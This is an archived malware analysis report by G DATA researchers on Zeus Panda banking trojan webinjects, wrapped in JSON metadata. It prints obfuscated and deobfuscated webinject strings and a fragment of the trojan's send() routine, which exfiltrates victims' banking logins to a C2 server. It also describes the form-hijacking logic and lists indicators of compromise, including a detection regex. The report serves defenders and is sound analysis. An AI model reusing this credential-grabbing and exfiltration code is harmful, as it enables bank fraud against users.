{
    "id": "4a4b9751-79e8-4575-9d2d-5dddb4ae9051",
    "created_at": "2023-01-12T15:08:00.881921Z",
    "updated_at": "2025-03-27T02:05:20.808288Z",
    "deleted_at": null,
    "sha1_hash": "b12c59fc9c95b4cfa8e03c284454cb8639468f72",
    "title": "2017-02-03 - Zeus Panda Webinjects- a case study",
    "authors": "",
    "file_creation_date": "2022-05-28T03:48:43Z",
    "file_modification_date": "2022-05-28T03:48:43Z",
    "file_size": 238538,
    "plain_text": "# Zeus Panda Webinjects: a case study\n\n**cyber.wtf/2017/02/03/zeus-panda-webinjects-a-case-study/**\n\nFebruary 3, 2017\n\nOur mothership G DATA runs extensive automated sample processing infrastructure as part of providing\nup to date protection to their AV customers. At G DATA Advanced Analytics, we have integrated these\nprocesses within our own routines in order to maintain the fraud detection solutions we provide to our\ncustomers from the financial sector.\n\nWe have been observing an increase in Zeus Panda infections recently. When we decrypted the config\nfiles from samples of Zeus Panda Banking Trojans that went through our processing this week, we\ndecided to have a closer look at the current features. The low level functionality of the Zeus Panda\n[Banking Trojan is already known quite well, so we focus our analysis on the webinjects. These webinjects](https://www.proofpoint.com/us/threat-insight/post/panda-banker-new-banking-trojan-hits-the-market)\nare used to manipulate the functionality of the target online banking websites on the client. The one we\nfound here was pretty interesting. As usual, the JavaScript is protected by an obfuscation layer, which\nsubstitutes string and function names using the following mapping array:\n```\nvar _0x2f90 = [\"\", \"\\x64\\x6F\\x6E\\x65\", \"\\x63\\x61\\x6C\\x6C\\x65\\x65\", \"\\x73\\x63\\x72\\x69\\x70\\x74\",\n\"\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\", \"\\x74\\x79\\x70\\x65\",\n\"\\x74\\x65\\x78\\x74\\x2F\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\", \"\\x73\\x72\\x63\",\n\"\\x3F\\x74\\x69\\x6D\\x65\\x3D\", \"\\x61\\x70\\x70\\x65\\x6E\\x64\\x43\\x68\\x69\\x6C\\x64\", \"\\x68\\x65\\x61\\x64\",\n\"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x73\\x42\\x79\\x54\\x61\\x67\\x4E\\x61\\x6D\\x65\",\n\"\\x76\\x65\\x72\", \"\\x46\\x46\", \"\\x61\\x64\\x64\\x45\\x76\\x65\\x6E\\x74\\x4C\\x69\\x73\\x74\\x65\\x6E\\x65\\x72\",\n\"\\x44\\x4F\\x4D\\x43\\x6F\\x6E\\x74\\x65\\x6E\\x74\\x4C\\x6F\\x61\\x64\\x65\\x64\",\n\"\\x72\\x65\\x61\\x64\\x79\\x53\\x74\\x61\\x74\\x65\", \"\\x63\\x6F\\x6D\\x70\\x6C\\x65\\x74\\x65\",\n\"\\x6D\\x73\\x69\\x65\\x20\\x36\", \"\\x69\\x6E\\x64\\x65\\x78\\x4F\\x66\",\n\"\\x74\\x6F\\x4C\\x6F\\x77\\x65\\x72\\x43\\x61\\x73\\x65\", \"\\x75\\x73\\x65\\x72\\x41\\x67\\x65\\x6E\\x74\",\n\"\\x49\\x45\\x36\", \"\\x6D\\x73\\x69\\x65\\x20\\x37\", \"\\x49\\x45\\x37\", \"\\x6D\\x73\\x69\\x65\\x20\\x38\",\n\"\\x49\\x45\\x38\", \"\\x6D\\x73\\x69\\x65\\x20\\x39\", \"\\x49\\x45\\x39\", \"\\x6D\\x73\\x69\\x65\\x20\\x31\\x30\",\n\"\\x49\\x45\\x31\\x30\", \"\\x66\\x69\\x72\\x65\\x66\\x6F\\x78\", \"\\x4F\\x54\\x48\\x45\\x52\",\n\"\\x5F\\x62\\x72\\x6F\\x77\\x73\\x2E\\x63\\x61\\x70\",\n\"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\", \"\\x64\\x69\\x73\\x70\\x6C\\x61\\x79\",\n\"\\x73\\x74\\x79\\x6C\\x65\", \"\\x6E\\x6F\\x6E\\x65\", \"\\x68\\x74\\x6D\\x6C\",\n\"\\x70\\x6F\\x73\\x69\\x74\\x69\\x6F\\x6E\", \"\\x66\\x69\\x78\\x65\\x64\", \"\\x74\\x6F\\x70\", \"\\x30\\x70\\x78\",\n\"\\x6C\\x65\\x66\\x74\", \"\\x77\\x69\\x64\\x74\\x68\", \"\\x31\\x30\\x30\\x25\", \"\\x68\\x65\\x69\\x67\\x68\\x74\",\n\"\\x7A\\x49\\x6E\\x64\\x65\\x78\", \"\\x39\\x39\\x39\\x39\\x39\\x39\",\n\"\\x62\\x61\\x63\\x6B\\x67\\x72\\x6F\\x75\\x6E\\x64\", \"\\x23\\x46\\x46\\x46\\x46\\x46\\x46\"];\n// ... further script code ...\n\n```\nAfter deobfuscating this script, the result looks like:\n```\nvar vars = [\"\", \"done\", \"callee\", \"script\", \"createElement\", \"type\", \"text/javascript\", \"src\", \"?\ntime=\", \"appendChild\", \"head\", \"getElementsByTagName\", \"ver\", \"FF\", \"addEventListener\",\n\"DOMContentLoaded\", \"readyState\", \"complete\", \"msie 6\", \"indexOf\", \"toLowerCase\", \"userAgent\",\n\"IE6\", \"msie 7\", \"IE7\", \"msie 8\", \"IE8\", \"msie 9\", \"IE9\", \"msie 10\", \"IE10\", \"firefox\", \"OTHER\",\n\"_brows.cap\", \"getElementById\", \"display\", \"style\", \"none\", \"html\", \"position\", \"fixed\", \"top\",\n\"0px\", \"left\", \"width\", \"100%\", \"height\", \"zIndex\", \"999999\", \"background\", \"#FFFFFF\"];\n// ... further script code ...\n\n```\nTaking a closer look at the now revealed functionality, we can identify the following features:\n\nBrowser version check, to add a browser specific event listener (e.g. for Firefox the\n_DOMContentLoaded event is used)_\n\n\n-----\n\nSetting some trojan configuration variables like:\n\nbotid: Unique Identifier of the compromised system\ninject: URL to load the next attack stage\nLoad and execute further target (bank) specific JavaScript code, as defined in the inject variable.\n\nAs it turns out, the first webinject stage is a generic loader to get target specific attack code from a web\nserver. In this context ‘target’ refers to banks and payment service providers. This is not a remarkable fact\nin itself, as current webinjects tend to load the final attack in multiple stages. But maybe this server also\nincludes further Zeus Panda components. So let’s take a closer look.\n\n## Target specific code and examples\n\nAfter downloading the target specific second stage of the webinject, we were surprised about the actual\nsize of the file: 91.8 KB.\n\nA brief analysis showed a lot of functionality. Some of the functions are generic and work on every\nwebsite. Others include target specific code, like specific HTML attributes. For example, the webinject\nuses unique id attributes to identify concrete websites of the online banking target. We are still\ninvestigating a lot of the included functionality at the time of writing. For now, we want to give a brief\noverview of selected parts of the basic functionality.\n\nFigure\n\n\n-----\n\n1: Flowchart of init function\nAfter loading the target specific JavaScript, the init function shown in figure [Figure 1] is called. First, the\nfunction checks if it is on top of the page. If not, the showpage() function is called, searches for the\nidentifier _brows.cap and deletes this DOM element if present. Otherwise the next check function are() is\ncalled, which searches for the strings “login”, “password” and “button”. If none of these strings can be\nfound, the get() function is called to check if the user is currently logged in. This is done by checking for\nthe presence of the logout element, which is only available when the user is currently logged in. If not, the\nalready described showpage() function is triggered to clean up. Otherwise the status() function is used to\nset the status variable to the string “CP”. Afterwards the collected data is exfiltrated via the send()\nfunction, described in detail in the next section.\n\nIf all target strings were found (“login”, “password” and “button”), the next functions preventDefault() and\n_stopPropagation() are called (left branch of figure 1). This overwrites the the default form action to collect_\nthe data the user enters into the form. Additionally the key event of the enter button (key code 13) is\nintercepted so that the form data is captured regardless of the submit method.\n\nAs this implementation is not working in Internet Explorer, the script checks for the presence of the\n_cancelBubble event. If present, a specific Internet Explorer implementation is called, which provides the_\nsame functionality as the stopPropagation() function. As in the initial webinject, different code is available\nto support all major browsers.\n\nAfter collecting form input data, the function status() is called to set the branch variable. The branch\nvariable defines which action is triggered. In our callflow example (left branch), the value is set to the\nstring “SL” which triggers a visible overlay of the website indicating to the user that there is a temporary\n\n\n-----\n\nproblem with the site. The following examples show two different target variations:\n\nFigure 2: German example for a temporarily unavailable\n\nFigure 3: English example of a different\n\ntarget\nAfterwards the send() function is triggered to exfiltrate the collected data.\n\n## Exfiltration\n\nThe next interesting part in the code is the exfiltration function used during this attack stage. The collected\ninformation is handed to a function called send():\n```\nsend: function () {\n  var l = link.gate + '?botid=' + _tables.encode(_brows.botid) + '&hash=' + new Date() +\n'&bname=' + _tables.get('bank');\n  for (var i = 0; i < arguments.length; i++) {\n    for (key in arguments[i]) {\n      l += '&' + key + '=' + _tables.encode(arguments[i][key]);\n    }\n  }\n// ... further code ...\n\n```\nThis function simply sets all collected data as GET Parameters and sends a HTTPS request to a PHP\nbackend, defined in the variable link.gate. Depending on the target website, we could observe different\nparameters and small differences in the construction of the parameter values. The following list gives an\noverview of identified parameters. This list is not complete and some of the parameters are optional. All\nparameters are send in plain text to the C2 backend.\n\n**Paramter name** **Value**\n\nbotid Unique client identifier\n\nbname Target identifier\n\nhash Timestamp (new Date())\n\nlogin1 user name\n\nlogin2 user password\n\n\n-----\n\n**Paramter name** **Value**\n\ntype module type (grabber, ats, intercepts)\n\nparam1 start\n\ndomain document.location\n\nbranch Status to trigger different functionalities\n\nWe intend to provide further details in a follow-up post. However, now we need to talk about the backend.\nBehold the Zeus Panda administration panel:\n\n## Admin Panel Details\n\nThe webinject code naturally led us to C2 servers and a closer analysis led us to an admin panel on one\nof the servers we investigated.\n\nFigure 4: Admin-Panel\nFigure 4 displays the start screen of the Admin-Panel. Every infected machine is displayed in one row. For\nevery entry the following information is listed:\n\n1. BotId: Unique identifier for the compromised system\n2. The active module type\n3. Job status of the entry\n4. Login credentials (username/password)\n5. Account status\n6. Victim IP address\n7. Timestamp of infection\n8. Browser version\n9. Target URL (bank)\n\nThe top navigation bar lists some available filters like format settings, drop zones and further configuration\nsettings.\n\nThe panel is used by the attacker to see new victim machines and available actions. By clicking on the\nentries, the attacker can view detailed information about the compromised user. For example, details like\nthe account balance of the victim, the amount available for transfer and even the transaction limit can be\ndisplayed. Furthermore the attacker can attach notes to the specific victim, to keep track of his fraudulent\nactions.\n\n\n-----\n\nFigure 5: Admin\nPanel detail view\n\n## Conclusion\n\nBanking Trojans are still one of the most valuable sources of income for criminals online. Given the fact\nthat this kind of malware has been developed and optimized for many years, it’s not surprising that we\ncan observe rather a high code quality. With the Admin-Panel, the attacker has a way to manage the\ncompromised machines without the need to know technical infection details, making this kind of revenue\nstream accessible also to the technically rather illiterate.\n\nIn the follow-up blog post, we will take a closer look into target specific webinject scripts.\n\n## Indicators of compromise\n\n**Script-**\n**Stage** **IoC** **Functionality**\n\n\n1st stage SHA256:\nd8444c2c23e7469a518b303763edfe5fd38f9ffd11d42bfdba2663b9caf3de06\n\n1st stage `_brows.botid`\ninitial `_brows.inject`\nwebinject\n\n\n2nd\nstage\n\n2nd\nstage\ntarget\nspecific\n\n\nSHA256:\na99e2d6ec2a1c5b5e59c544302aa61266bb0b7d0d76f4ebed17a3906f94c2794\n\n\\.php\\?(&?(botid|hash|bname|login1|login2|type|param1|domain|branch)=[^&]*)\n{4,9}$\n\n\nLoader\n\nLoader\n\nExfiltration\n\nExfiltration\n\n\nAuthors: Manuel Körber-Bilgard and Karsten Tellmann\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-02-03 - Zeus Panda Webinjects- a case study.pdf"
    ],
    "report_names": [
        "2017-02-03 - Zeus Panda Webinjects- a case study.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536080,
    "ts_updated_at": 1743041120,
    "ts_creation_date": 1653709723,
    "ts_modification_date": 1653709723,
    "files": {
        "pdf": "https://archive.orkl.eu/b12c59fc9c95b4cfa8e03c284454cb8639468f72.pdf",
        "text": "https://archive.orkl.eu/b12c59fc9c95b4cfa8e03c284454cb8639468f72.txt",
        "img": "https://archive.orkl.eu/b12c59fc9c95b4cfa8e03c284454cb8639468f72.jpg"
    }
}